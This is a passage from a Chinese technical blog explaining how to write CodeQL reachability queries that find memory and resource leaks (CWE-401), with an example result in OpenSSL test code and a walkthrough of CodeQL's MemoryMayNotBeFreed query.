_)</span></span></span><br><span class="line"><span class="function">      )</span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">  )</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">predicate <span class="title">closeCall</span><span class="params">(ControlFlowNode n, Variable v)</span> </span>&#123;</span><br><span class="line">  exists(<span class="keyword">int</span> arg | n.(Call).getArgument(arg) = v.getAnAccess() and</span><br><span class="line">  checkNameClose(n.(Call).getTarget()))</span><br><span class="line">  or</span><br><span class="line">  exists(FunctionCall midcall, Function mid, <span class="keyword">int</span> arg |</span><br><span class="line">    <span class="comment">// indirect free call</span></span><br><span class="line">    n.(Call).getArgument(arg) = v.getAnAccess() and</span><br><span class="line">    mayCallFunction(n, mid) and</span><br><span class="line">    midcall.getEnclosingFunction() = mid and</span><br><span class="line">    closeCall(midcall, mid.getParameter(arg))</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">openDefinition</span><span class="params">(StackVariable v, ControlFlowNode def)</span> </span>&#123;</span><br><span class="line">  exists(Expr expr | exprDefinition(v, def, expr) <span class="function">and <span class="title">openCall</span><span class="params">(expr)</span>)</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">class OpenVariableReachability extends StackVariableReachabilityWithReassignment </span>&#123;</span><br><span class="line">  OpenVariableReachability() &#123; <span class="keyword">this</span> = <span class="string">"OpenVariableReachability"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSourceActual</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    openDefinition(v, node)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSinkActual</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// node may be used in allocationReaches</span></span><br><span class="line">    exists(node.(AnalysedExpr).getNullSuccessor(v)) or</span><br><span class="line">    closeCall(node, v) or</span><br><span class="line">    assignedToFieldOrGlobal(v, node) or</span><br><span class="line">    <span class="comment">// node may be used directly in query</span></span><br><span class="line">    v.getFunction() = node.(ReturnStmt).getEnclosingFunction()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isBarrier</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123; definitionBarrier(v, node) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The value from allocation `def` is still held in Variable `v` upon entering `node`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">openVariableReaches</span><span class="params">(StackVariable v, ControlFlowNode def, ControlFlowNode node)</span> </span>&#123;</span><br><span class="line">  exists(OpenVariableReachability r |</span><br><span class="line">    <span class="comment">// reachability</span></span><br><span class="line">    r.reachesTo(def, _, node, v)</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// accept def node itself</span></span><br><span class="line">    r.isSource(def, v) and</span><br><span class="line">    node = def</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OpenReachability</span> <span class="keyword">extends</span> <span class="title">StackVariableReachabilityExt</span> </span>&#123;</span><br><span class="line">  OpenReachability() &#123; <span class="keyword">this</span> = <span class="string">"OpenReachability"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    openDefinition(v, node)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    v.getFunction() = node.(ReturnStmt).getEnclosingFunction()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isBarrier</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    ControlFlowNode source, ControlFlowNode node, ControlFlowNode next, StackVariable v</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span> </span>&#123;</span><br><span class="line">    isSource(source, v) and</span><br><span class="line">    next = node.getASuccessor() and</span><br><span class="line">    <span class="comment">// the memory (stored in any variable `v0`) allocated at `source` is freed or</span></span><br><span class="line">    <span class="comment">// assigned to a global at node, or NULL checked on the edge node -&gt; next.</span></span><br><span class="line">    exists(StackVariable v0 | openVariableReaches(v0, source, node) |</span><br><span class="line">      node.(AnalysedExpr).getNullSuccessor(v0) = next or</span><br><span class="line">      closeCall(node, v0) or</span><br><span class="line">      assignedToFieldOrGlobal(v0, node)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">openReaches</span><span class="params">(ControlFlowNode def, ControlFlowNode node)</span> </span>&#123;</span><br><span class="line">  exists(OpenReachability r | r.reaches(def, _, node))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from ControlFlowNode def, ReturnStmt ret</span><br><span class="line">where</span><br><span class="line">  openReaches(def, ret) and</span><br><span class="line">  <span class="function">not <span class="title">exists</span><span class="params">(StackVariable v |</span></span></span><br><span class="line"><span class="function"><span class="params">    openVariableReaches(v, def, ret)</span> and</span></span><br><span class="line"><span class="function">    ret.getAChild*<span class="params">()</span> </span>= v.getAnAccess()</span><br><span class="line">  )</span><br><span class="line">select def, ret,def.getLocation()</span><br></pre></td></tr></table></figure><h3><span id="pstep4-cha-xun-jie-guo">STEP4 查询结果</span><a href="#pstep4-cha-xun-jie-guo" class="header-anchor">#</a></h3><p>最后的结果如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-16-110204.png" alt="image-20201116190204544"></p><p>可以看到找到了两个结果，当然这两个结果是在一个函数内，只是返回路径不同，所以报了两个结果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> EVP_PKEY *<span class="title">get_test_pkey</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> n[] =</span><br><span class="line">        <span class="string">"\x00\xAA\x36\xAB\xCE\x88\xAC\xFD\xFF\x55\x52\x3C\x7F\xC4\x52\x3F"</span></span><br><span class="line">        <span class="string">"\x90\xEF\xA0\x0D\xF3\x77\x4A\x25\x9F\x2E\x62\xB4\xC5\xD9\x9C\xB5"</span></span><br><span class="line">        <span class="string">"\xAD\xB3\x00\xA0\x28\x5E\x53\x01\x93\x0E\x0C\x70\xFB\x68\x76\x93"</span></span><br><span class="line">        <span class="string">"\x9C\xE6\x16\xCE\x62\x4A\x11\xE0\x08\x6D\x34\x1E\xBC\xAC\xA0\xA1"</span></span><br><span class="line">        <span class="string">"\xF5"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> e[] = <span class="string">"\x11"</span>;</span><br><span class="line"></span><br><span class="line">    RSA *rsa = RSA_new();</span><br><span class="line">    EVP_PKEY *pk = EVP_PKEY_new();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rsa == <span class="literal">NULL</span> || pk == <span class="literal">NULL</span> || !EVP_PKEY_assign_RSA(pk, rsa)) &#123;</span><br><span class="line">        RSA_free(rsa);</span><br><span class="line">        EVP_PKEY_free(pk);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!RSA_set0_key(rsa, BN_bin2bn(n, <span class="keyword">sizeof</span>(n)<span class="number">-1</span>, <span class="literal">NULL</span>),</span><br><span class="line">                      BN_bin2bn(e, <span class="keyword">sizeof</span>(e)<span class="number">-1</span>, <span class="literal">NULL</span>), <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        EVP_PKEY_free(pk);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在第23行和第26行的<code>return</code>语句前，都没有对<code>rsa</code>进行释放，不过这同样还是在测试的代码里，没有什么价值(但是不妨碍我们提交issue，手动狗头)</p><p><a href="https://github.com/openssl/openssl/issues/13420%EF%BC%8C%E5%BE%88%E5%BC%80%E5%BF%83%E5%BE%97%E5%88%B0%E4%BA%86%E5%BC%80%E5%8F%91%E8%80%85%E7%9A%84%E5%9B%9E%E5%BA%94%EF%BC%8C%E4%BD%86%E6%98%AF%E5%BE%88%E6%98%8E%E6%98%BE%E5%82%BB%E9%80%BC%E7%9A%84%E6%88%91%E6%B2%A1%E6%9C%89%E7%9C%8B%E5%88%B0%E5%87%BD%E6%95%B0">https://github.com/openssl/openssl/issues/13420，很开心得到了开发者的回应，但是很明显傻逼的我没有看到函数</a><code>EVP_PKEY_assign_RSA</code>其实是把<code>rsa</code>赋值给了<code>pk</code>，所以在<code>free</code>掉<code>pk</code>的时候，其实也是释放了<code>rsa</code>的空间(提之前我还用<code>valgrind</code>测了没啥问题，我还以为是<code>valgrind</code>出错了，md)。</p><h3><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h3><p>通过上面的惨痛经历，可以看到虽然确实存在函数失配的问题，但对于上面的误报，脚本目前还不能解决，因此还需要更近一步的改进。</p>]]></content>
      <categories>
        <category>research</category>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL之CWE-401(2)</title>
    <url>/aaf64f84.html</url>
    <content><![CDATA[<blockquote><p>在写第二类<code>CWE-401</code>的查询脚本前，我们需要补充一些东西、在能找到的<code>codeql</code>文档里，大部分都只强推了它的<code>DataFlow</code>模块，而在写第二类查询脚本时，需要用到它的可达性分析模块<code>import semmle.code.cpp.controlflow.StackVariableReachability</code></p></blockquote><a id="more"></a><h3><span id="pcodeql-ke-da-xing-fen-xi-mo-kuai">CodeQL可达性分析模块</span><a href="#pcodeql-ke-da-xing-fen-xi-mo-kuai" class="header-anchor">#</a></h3><p>在这个模块里，存在三个抽象类<code>StackVariableReachability</code>、<code>StackVariableReachabilityWithReassignment</code>和<code>StackVariableReachabilityExt</code></p><h4><span id="pstackvariablereachability">StackVariableReachability</span><a href="#pstackvariablereachability" class="header-anchor">#</a></h4><p><code>StackVariableReachability</code>存在三个抽象函数，需要自己实现具体内容。<code>isSource</code>和<code>isSink</code>很好理解。<code>isBarrier</code>是指中间不允许出现的某个节点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Holds if `node` is a source for the reachability analysis using variable `v`. */</span></span><br><span class="line">  <span class="function"><span class="keyword">abstract</span> predicate <span class="title">isSource</span><span class="params">(ControlFlowNode node, StackVariable v)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Holds if `sink` is a (potential) sink for the reachability analysis using variable `v`. */</span></span><br><span class="line">  <span class="function"><span class="keyword">abstract</span> predicate <span class="title">isSink</span><span class="params">(ControlFlowNode node, StackVariable v)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Holds if `node` is a barrier for the reachability analysis using variable `v`. */</span></span><br><span class="line">  <span class="function"><span class="keyword">abstract</span> predicate <span class="title">isBarrier</span><span class="params">(ControlFlowNode node, StackVariable v)</span></span>;</span><br></pre></td></tr></table></figure><p>同时也有可达性分析的函数<code>reaches</code>的描述为<code>Holds if the source node can reach the sink node without crossing a barrier</code>，也就是说可达是指，我从<code>source</code>点到<code>sink</code>点，但是不想经过<code>barrier</code>。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">predicate reaches(ControlFlowNode source, SemanticStackVariable v, ControlFlowNode sink) &#123;</span><br><span class="line">   exists(BasicBlock bb, int i |</span><br><span class="line">     isSource(source, v) and</span><br><span class="line">     bb.getNode(i) = source and</span><br><span class="line">     not bb.isUnreachable()</span><br><span class="line">   |</span><br><span class="line">     exists(int j |</span><br><span class="line">       j &gt; i and</span><br><span class="line">       sink = bb.getNode(j) and</span><br><span class="line">       isSink(sink, v) and</span><br><span class="line">       not exists(int k | isBarrier(bb.getNode(k), v) | k in [i + 1 .. j - 1])</span><br><span class="line">     )</span><br><span class="line">     or</span><br><span class="line">     not exists(int k | isBarrier(bb.getNode(k), v) | k &gt; i) and</span><br><span class="line">     bbSuccessorEntryReaches(bb, v, sink, _)</span><br><span class="line">   )</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>reaches</code>函数是在一个函数内判断的，它其实是分为两类进行的。</p><ul><li>第一类：<code>source、sink、barrier</code>在一个基本块内。那么就是判断source点、sink都点在基本块内，且满足前后控制流关系，并且不存在一个barrier点。</li><li>第二类：<code>source、sink、barrier</code>是跨基本块的。还是先判断source点存在于当前基本块，然后在它的后继基本块里继续找<code>sink</code>点和<code>barrier</code>点，即调用<code>bbSuccessorEntryReaches</code>函数，具体细节就不多说啦。</li></ul><h4><span id="pstackvariablereachabilityext">StackVariableReachabilityExt</span><a href="#pstackvariablereachabilityext" class="header-anchor">#</a></h4><p><code>StackVariableReachabilityExt</code>和<code>StackVariableReachability</code>类似，从注释里我们可以看出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Same as `StackVariableReachability`, but `isBarrier` works on control-flow</span></span><br><span class="line"><span class="comment"> * edges rather than nodes and is therefore parameterized by the original</span></span><br><span class="line"><span class="comment"> * source node as well. Otherwise, this class is used like</span></span><br><span class="line"><span class="comment"> * `StackVariableReachability`.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>它和<code>StackVariableReachability</code>的区别在于<code>isBarrier</code>函数作用于边而不是控制流结点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** `node` is a barrier for the reachability analysis using variable `v` and starting from `source`. */</span></span><br><span class="line"><span class="function"><span class="keyword">abstract</span> predicate <span class="title">isBarrier</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ControlFlowNode source, ControlFlowNode node, ControlFlowNode next, StackVariable v</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h4><span id="pstackvariablereachabilitywithreassignment">StackVariableReachabilityWithReassignment</span><a href="#pstackvariablereachabilitywithreassignment" class="header-anchor">#</a></h4><p><code>StackVariableReachabilityWithReassignment</code>和之前的类似，区别在于这个类将重新赋值的情况考虑了进去</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reachability analysis for control-flow nodes involving stack variables.</span></span><br><span class="line"><span class="comment"> * Unlike `StackVariableReachability`, this analysis takes variable</span></span><br><span class="line"><span class="comment"> * reassignments into account.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This class is used like `StackVariableReachability`, except that</span></span><br><span class="line"><span class="comment"> * subclasses should override `isSourceActual` and `isSinkActual` instead of</span></span><br><span class="line"><span class="comment"> * `isSource` and `isSink`, and that there is a `reachesTo` predicate in</span></span><br><span class="line"><span class="comment"> * addition to `reaches`.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>同时使用<code>reachTo</code>替代父类的<code>reaches</code>条件，加入了其余的判断</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * As `reaches`, but also specifies the last variable it was reassigned to (`v0`).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">predicate reachesTo(</span><br><span class="line">  ControlFlowNode source, SemanticStackVariable v, ControlFlowNode sink, SemanticStackVariable v0</span><br><span class="line">) &#123;</span><br><span class="line">  exists(ControlFlowNode def |</span><br><span class="line">    actualSourceReaches(source, v, def, v0) and</span><br><span class="line">    StackVariableReachability.super.reaches(def, v0, sink) and</span><br><span class="line">    isSinkActual(sink, v0)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="pjin-yi-bu-shou-xi-ke-da-xing-fen-xi-mo-kuai">进一步熟悉可达性分析模块</span><a href="#pjin-yi-bu-shou-xi-ke-da-xing-fen-xi-mo-kuai" class="header-anchor">#</a></h3><p>CodeQL开发者在示例代码中有两处可以让我们更好的了解上面的三个类的使用，一个是<code>https://github.com/github/codeql/blob/main/cpp/ql/src/Critical/MemoryMayNotBeFreed.ql</code>另一个是<code>https://github.com/github/codeql/blob/main/cpp/ql/src/Critical/FileMayNotBeClosed.ql</code></p><p>分别用于寻找<code>CWE-401</code>和<code>CWE-755</code>，而在我看来这两类其实都属于函数调用失配的情况，即调用了<code>malloc</code>没有调用<code>free</code>，调用了<code>fopen</code>，没有调用<code>fclose</code>。这里我们通过<code>MemoryMayNotBeFreed</code>进一步熟悉可达性分析模块。</p><h4><span id="pzhi-jie-diao-yong-or-jian-jie-diao-yong">直接调用or间接调用</span><a href="#pzhi-jie-diao-yong-or-jian-jie-diao-yong" class="header-anchor">#</a></h4><p>我们知道对一个函数的调用一般分为两种，第一种是直接调用，第二种是通过函数指针进行间接调用，为了同时考虑这两种情况，首先我们需要实现函数调用的函数如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * call is either a direct call to f, or a possible call to f</span></span><br><span class="line"><span class="comment"> * via a function pointer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">mayCallFunction</span><span class="params">(Expr call, Function f)</span> </span>&#123;</span><br><span class="line">  call.(FunctionCall).getTarget() = f or</span><br><span class="line">  call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() =</span><br><span class="line">    f</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FunctionCall</code>是直接调用，而<code>VariableCall</code>就是间接调用了，用来处理下面这类情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A C/C++ call which is performed through a variable of function pointer type.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * int call_via_ptr(int (*pfn)(int)) &#123;</span></span><br><span class="line"><span class="comment"> *   return pfn(5);</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>直接找到变量，然后看它是不是在某处获得了函数的地址即可。</p><blockquote><p>虽然<code>codeQL</code>的文档不多，但是通过看示例和它已有的注释，可以学到很多文档里没有的东西，不仅限于一些思路的写法和一些已有的API</p></blockquote><h4><span id="pfu-zhi-gei-quan-ju-or-mou-ge-lei-de-yu">赋值给全局or某个类的域</span><a href="#pfu-zhi-gei-quan-ju-or-mou-ge-lei-de-yu" class="header-anchor">#</a></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">assignedToFieldOrGlobal</span><span class="params">(StackVariable v, Expr e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// assigned to anything except a StackVariable</span></span><br><span class="line">  <span class="comment">// (typically a field or global, but for example also *ptr = v)</span></span><br><span class="line">  e.(Assignment).getRValue() = v.getAnAccess() and</span><br><span class="line">  not e.(Assignment).getLValue().(VariableAccess).getTarget() <span class="keyword">instanceof</span> StackVariable</span><br><span class="line">  or</span><br><span class="line">  exists(Expr midExpr, Function mid, <span class="keyword">int</span> arg |</span><br><span class="line">    <span class="comment">// indirect assignment</span></span><br><span class="line">    e.(FunctionCall).getArgument(arg) = v.getAnAccess() and</span><br><span class="line">    mayCallFunction(e, mid) and</span><br><span class="line">    midExpr.getEnclosingFunction() = mid and</span><br><span class="line">    assignedToFieldOrGlobal(mid.getParameter(arg), midExpr)</span><br><span class="line">  )</span><br><span class="line">  or</span><br><span class="line">  <span class="comment">// assigned to a field via constructor field initializer</span></span><br><span class="line">  e.(ConstructorFieldInit).getExpr() = v.getAnAccess()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般情况下，有这么两类内存分配是不一定在当前函数释放，第一类是全局的变量，它的内存释放可以在程序退出后自行释放，第二类是类内的局部变量，是由类在析构的时候释放的。</p><p><code>assignedToFieldOrGlobal</code>函数用于判断这两种情况，避免误报产生。第一种是：一个表达式，右侧是局部变量，左侧不是局部变量(也就是全局变量)，这是直接赋值的情况；第三种是：在类的初始化时进行赋值；第二种是间接赋值，比如说通过参数调用函数，然后在函数内对这个参数进行了赋值。</p><h4><span id="palloccallorindirect">allocCallOrIndirect</span><a href="#palloccallorindirect" class="header-anchor">#</a></h4><p><code>allocCallOrIndirect</code>是用来找<code>source</code>点的，因为我们要找<code>MemoryMayNotBeFreed</code>的情况，所以我们的<code>source</code>点肯定是对分配内存函数的调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">allocCallOrIndirect</span><span class="params">(Expr e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// direct alloc call</span></span><br><span class="line">  e.(AllocationExpr).requiresDealloc() and</span><br><span class="line">  <span class="comment">// We are only interested in alloc calls that are</span></span><br><span class="line">  <span class="comment">// actually freed somehow, as MemoryNeverFreed</span></span><br><span class="line">  <span class="comment">// will catch those that aren't.</span></span><br><span class="line">  allocMayBeFreed(e)</span><br><span class="line">  or</span><br><span class="line">  exists(ReturnStmt rtn |</span><br><span class="line">    <span class="comment">// indirect alloc call</span></span><br><span class="line">    mayCallFunction(e, rtn.getEnclosingFunction()) and</span><br><span class="line">    (</span><br><span class="line">      <span class="comment">// return alloc</span></span><br><span class="line">      allocCallOrIndirect(rtn.getExpr())</span><br><span class="line">      or</span><br><span class="line">      <span class="comment">// return variable assigned with alloc</span></span><br><span class="line">      exists(Variable v |</span><br><span class="line">        v = rtn.getExpr().(VariableAccess).getTarget() and</span><br><span class="line">        allocCallOrIndirect(v.getAnAssignedValue()) and</span><br><span class="line">        <span class="function">not <span class="title">assignedToFieldOrGlobal</span><span class="params">(v, _)</span></span></span><br><span class="line"><span class="function">      )</span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">  )</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><h4><span id="pfreecallorindirect">freeCallOrIndirect</span><a href="#pfreecallorindirect" class="header-anchor">#</a></h4><p>在找内存未释放漏洞时，我们肯定要判断是不是有释放点，因此<code>freeCallOrIndirect</code>就是为了找内存释放的点，同时realloc也是一种内存释放</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The point at which a call to 'realloc' on 'v' has been verified to</span></span><br><span class="line"><span class="comment"> * succeed.  A failed realloc does *not* free the input pointer, which</span></span><br><span class="line"><span class="comment"> * can cause memory leaks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">verifiedRealloc</span><span class="params">(FunctionCall reallocCall, Variable v, ControlFlowNode verified)</span> </span>&#123;</span><br><span class="line">  reallocCall.(AllocationExpr).getReallocPtr() = v.getAnAccess() and</span><br><span class="line">  (</span><br><span class="line">    exists(Variable newV, ControlFlowNode node |</span><br><span class="line">      <span class="comment">// a realloc followed by a null check at 'node' (return the non-null</span></span><br><span class="line">      <span class="comment">// successor, i.e. where the realloc is confirmed to have succeeded)</span></span><br><span class="line">      newV.getAnAssignedValue() = reallocCall and</span><br><span class="line">      node.(AnalysedExpr).getNonNullSuccessor(newV) = verified and</span><br><span class="line">      <span class="comment">// note: this case uses naive flow logic (getAnAssignedValue).</span></span><br><span class="line">      <span class="comment">// special case: if the result of the 'realloc' is assigned to the</span></span><br><span class="line">      <span class="comment">// same variable, we don't descriminate properly between the old</span></span><br><span class="line">      <span class="comment">// and the new allocation; better to not consider this a free at</span></span><br><span class="line">      <span class="comment">// all in that case.</span></span><br><span class="line">      newV != v</span><br><span class="line">    )</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// a realloc(ptr, 0), which always succeeds and frees</span></span><br><span class="line">    <span class="comment">// (return the realloc itself)</span></span><br><span class="line">    reallocCall.(AllocationExpr).getReallocPtr().getValue() = <span class="string">"0"</span> and</span><br><span class="line">    verified = reallocCall</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">freeCallOrIndirect</span><span class="params">(ControlFlowNode n, Variable v)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// direct free call</span></span><br><span class="line">  n.(DeallocationExpr).getFreedExpr() = v.getAnAccess() and</span><br><span class="line">  <span class="function">not <span class="title">exists</span><span class="params">(n.(AllocationExpr)</span>.<span class="title">getReallocPtr</span><span class="params">()</span>)</span></span><br><span class="line"><span class="function">  or</span></span><br><span class="line"><span class="function">  <span class="comment">// verified realloc call</span></span></span><br><span class="line"><span class="function">  <span class="title">verifiedRealloc</span><span class="params">(_, v, n)</span></span></span><br><span class="line"><span class="function">  or</span></span><br><span class="line"><span class="function">  <span class="title">exists</span><span class="params">(FunctionCall midcall, Function mid, <span class="keyword">int</span> arg |</span></span></span><br><span class="line"><span class="function"><span class="params">    // indirect free call</span></span></span><br><span class="line"><span class="function"><span class="params">    n.(Call)</span>.<span class="title">getArgument</span><span class="params">(arg)</span> </span>= v.getAnAccess() and</span><br><span class="line">    mayCallFunction(n, mid) and</span><br><span class="line">    midcall.getEnclosingFunction() = mid and</span><br><span class="line">    freeCallOrIndirect(midcall, mid.getParameter(arg))</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="pallocvariablereachability">AllocVariableReachability</span><a href="#pallocvariablereachability" class="header-anchor">#</a></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">allocationDefinition</span><span class="params">(StackVariable v, ControlFlowNode def)</span> </span>&#123;</span><br><span class="line">  exists(Expr expr | exprDefinition(v, def, expr) <span class="function">and <span class="title">allocCallOrIndirect</span><span class="params">(expr)</span>)</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">class AllocVariableReachability extends StackVariableReachabilityWithReassignment </span>&#123;</span><br><span class="line">  AllocVariableReachability() &#123; <span class="keyword">this</span> = <span class="string">"AllocVariableReachability"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSourceActual</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    allocationDefinition(v, node)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSinkActual</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// node may be used in allocationReaches</span></span><br><span class="line">    exists(node.(AnalysedExpr).getNullSuccessor(v)) or</span><br><span class="line">    freeCallOrIndirect(node, v) or</span><br><span class="line">    assignedToFieldOrGlobal(v, node) or</span><br><span class="line">    <span class="comment">// node may be used directly in query</span></span><br><span class="line">    v.getFunction() = node.(ReturnStmt).getEnclosingFunction()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isBarrier</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123; definitionBarrier(v, node) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AllocVariableReachability</code>是对<code>StackVariableReachabilityWithReassignment</code>的继承。<code>source</code>点是：存在一个表达式，它调用了分配内存的函数并赋值给了局部变量<code>v</code>。<code>sink</code>点可以是free或者是赋值给了全局的变量。<code>barrier</code>是通过库中的函数实现的，目的是判断重新赋值的情况。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Holds if `barrier` is either a (potential) definition of `v` or follows an</span></span><br><span class="line"><span class="comment"> * access that gets the address of `v`. In both cases, the value of</span></span><br><span class="line"><span class="comment"> * `v` after `barrier` cannot be assumed to be the same as before.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">definitionBarrier</span><span class="params">(SemanticStackVariable v, ControlFlowNode barrier)</span></span></span><br></pre></td></tr></table></figure><h4><span id="pallocreachability">AllocReachability</span><a href="#pallocreachability" class="header-anchor">#</a></h4><p><code>AllocReachability</code>继承<code>StackVariableReachabilityExt</code>，source点同上，sink点是需要是和变量存在在一盒函数内的return语句，<code>barrier</code>是找被<code>free</code>、被赋值给全局变量或者已经经过了NULL检查的情况。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The value from allocation `def` is still held in Variable `v` upon entering `node`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">allocatedVariableReaches</span><span class="params">(StackVariable v, ControlFlowNode def, ControlFlowNode node)</span> </span>&#123;</span><br><span class="line">  exists(AllocVariableReachability r |</span><br><span class="line">    <span class="comment">// reachability</span></span><br><span class="line">    r.reachesTo(def, _, node, v)</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// accept def node itself</span></span><br><span class="line">    r.isSource(def, v) 